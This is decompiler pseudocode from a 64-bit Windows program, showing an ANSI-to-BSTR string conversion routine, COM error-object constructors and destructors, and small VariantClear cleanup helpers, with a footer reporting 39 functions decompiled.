//----- (0000000140002D00) ----------------------------------------------------
__int64 __fastcall HandleError(__int64 a1)
{
  return ((__int64 (__fastcall *)(__int64, _QWORD))off_140006030)(a1, 0);
}
// 140006030: using guessed type void (__fastcall __noreturn *off_140006030)();

//----- (0000000140002D10) ----------------------------------------------------
BSTR __fastcall ConvertAnsiToBSTR(LPCCH lpMultiByteStr)
{
  __int64 v3; // rbx
  unsigned __int64 v4; // rbx
  int v5; // eax
  int cchWideChar; // r14d
  size_t v7; // rcx
  __int64 v8; // rax
  void *v9; // rsp
  void *lpWideCharStr; // rdi
  BSTR v11; // rbx
  signed int LastError; // eax
  signed int v13; // eax
  WCHAR WideCharStr[2]; // [rsp+30h] [rbp+0h] BYREF
  int v15; // [rsp+34h] [rbp+4h]
  void *v16; // [rsp+38h] [rbp+8h]

  if ( !lpMultiByteStr )
    return 0;
  v3 = -1;
  do
    ++v3;
  while ( lpMultiByteStr[v3] );
  v4 = v3 + 1;
  if ( v4 > 0x7FFFFFFF )
  {
    HandleError(2147942487LL);
    __debugbreak();
  }
  v15 = v4;
  v5 = MultiByteToWideChar(0, 0, lpMultiByteStr, v4, 0, 0);
  cchWideChar = v5;
  *(_DWORD *)WideCharStr = v5;
  if ( !v5 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    HandleError((unsigned int)LastError);
    __debugbreak();
  }
  v7 = 2LL * v5;
  if ( v5 >= 4096 )
  {
    lpWideCharStr = malloc(v7);
  }
  else
  {
    v8 = v7 + 15;
    if ( v7 + 15 < v7 )
      v8 = 0xFFFFFFFFFFFFFF0LL;
    v9 = alloca(v8 & 0xFFFFFFFFFFFFFFF0uLL);
    lpWideCharStr = WideCharStr;
  }
  v16 = lpWideCharStr;
  if ( !lpWideCharStr )
    goto LABEL_18;
  if ( !MultiByteToWideChar(0, 0, lpMultiByteStr, v4, (LPWSTR)lpWideCharStr, cchWideChar) )
  {
    if ( cchWideChar >= 4096 )
      free(lpWideCharStr);
    v13 = GetLastError();
    if ( v13 > 0 )
      v13 = (unsigned __int16)v13 | 0x80070000;
    HandleError((unsigned int)v13);
    JUMPOUT(0x140002EA8LL);
  }
  v11 = SysAllocString((const OLECHAR *)lpWideCharStr);
  if ( cchWideChar >= 4096 )
    free(lpWideCharStr);
  if ( !v11 )
  {
LABEL_18:
    HandleError(2147942414LL);
    __debugbreak();
  }
  return v11;
}
// 140002EA7: control flows out of bounds to 140002EA8

//----- (0000000140002EB0) ----------------------------------------------------
__int64 __fastcall sub_140002EB0(__int64 a1, __int64 a2)
{
  __int64 v3; // rcx

  *(_QWORD *)a1 = &off_140004490;
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  v3 = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a1 + 16) = v3;
  *(_QWORD *)(a1 + 24) = 0;
  if ( v3 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 8LL))(v3);
  return a1;
}
// 140004490: using guessed type __int64 (__fastcall *off_140004490)(void *Block);

//----- (0000000140002F00) ----------------------------------------------------
__int64 __fastcall sub_140002F00(__int64 a1, int a2, __int64 a3, char a4)
{
  *(_DWORD *)(a1 + 8) = a2;
  *(_QWORD *)a1 = &off_140004490;
  *(_QWORD *)(a1 + 16) = a3;
  *(_QWORD *)(a1 + 24) = 0;
  if ( a3 && a4 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)a3 + 8LL))(a3);
  return a1;
}
// 140004490: using guessed type __int64 (__fastcall *off_140004490)(void *Block);

//----- (0000000140002F50) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_140002F50(_QWORD *a1))(void *Block)
{
  __int64 (__fastcall **result)(void *); // rax
  __int64 v3; // rcx
  void *v4; // rcx

  result = &off_140004490;
  *a1 = &off_140004490;
  v3 = a1[2];
  if ( v3 )
    result = (__int64 (__fastcall **)(void *))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);
  v4 = (void *)a1[3];
  if ( v4 )
    return (__int64 (__fastcall **)(void *))LocalFree(v4);
  return result;
}
// 140004490: using guessed type __int64 (__fastcall *off_140004490)(void *Block);

//----- (0000000140002FA0) ----------------------------------------------------
_QWORD *__fastcall sub_140002FA0(_QWORD *Block, char a2)
{
  __int64 v4; // rcx
  void *v5; // rcx

  *Block = &off_140004490;
  v4 = Block[2];
  if ( v4 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);
  v5 = (void *)Block[3];
  if ( v5 )
    LocalFree(v5);
  if ( (a2 & 1) != 0 )
    j_j_free(Block);
  return Block;
}
// 140004490: using guessed type __int64 (__fastcall *off_140004490)(void *Block);

//----- (0000000140003000) ----------------------------------------------------
void __fastcall __noreturn sub_140003000(int a1, __int64 a2)
{
  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  sub_140002F00((__int64)pExceptionObject, a1, a2, 0);
  throw (_com_error *)pExceptionObject;
}

//----- (0000000140003340) ----------------------------------------------------
__int64 __fastcall sub_140003340(__int64 a1, __int64 a2)
{
  return sub_140001F00(a2 + 160);
}
// 140001F00: using guessed type __int64 __fastcall sub_140001F00(_QWORD);

//----- (000000014000334C) ----------------------------------------------------
__int64 __fastcall sub_14000334C(__int64 a1, __int64 a2)
{
  return sub_140001F00(a2 + 136);
}
// 140001F00: using guessed type __int64 __fastcall sub_140001F00(_QWORD);

//----- (000000014000338D) ----------------------------------------------------
__int64 __fastcall sub_14000338D(__int64 a1, __int64 a2)
{
  return sub_140001F00(a2 + 144);
}
// 140001F00: using guessed type __int64 __fastcall sub_140001F00(_QWORD);

//----- (00000001400033B6) ----------------------------------------------------
__int64 __fastcall sub_1400033B6(__int64 a1, __int64 a2)
{
  return sub_140001900(a2 + 256);
}
// 140001900: using guessed type __int64 __fastcall sub_140001900(_QWORD);

//----- (00000001400033C2) ----------------------------------------------------
HRESULT __fastcall sub_1400033C2(__int64 a1, __int64 a2)
{
  return VariantClear((VARIANTARG *)(a2 + 200));
}

//----- (00000001400033CE) ----------------------------------------------------
HRESULT __fastcall sub_1400033CE(__int64 a1, __int64 a2)
{
  return VariantClear((VARIANTARG *)(a2 + 224));
}

//----- (00000001400033DA) ----------------------------------------------------
HRESULT __fastcall sub_1400033DA(__int64 a1, __int64 a2)
{
  return VariantClear((VARIANTARG *)(a2 + 176));
}

//----- (0000000140003420) ----------------------------------------------------
HRESULT sub_140003420()
{
  return VariantClear(&stru_140006038);
}
// 140006038: using guessed type VARIANTARG stru_140006038;

// nfuncs=127 queued=39 decompiled=39 lumina nreq=0 worse=0 better=0
// ALL OK, 39 function(s) have been successfully decompiled
